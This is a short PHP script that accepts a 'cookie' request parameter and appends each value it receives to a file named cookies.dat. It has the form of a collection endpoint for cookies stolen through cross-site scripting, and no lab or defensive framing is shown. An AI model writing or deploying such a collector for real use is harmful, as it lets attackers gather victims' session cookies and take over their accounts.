<?php

if (isset($_REQUEST['cookie'])){
    $cookie = $_REQUEST['cookie'];
    file_put_contents('cookies.dat', $cookie.PHP_EOL , FILE_APPEND | LOCK_EX);
}

?>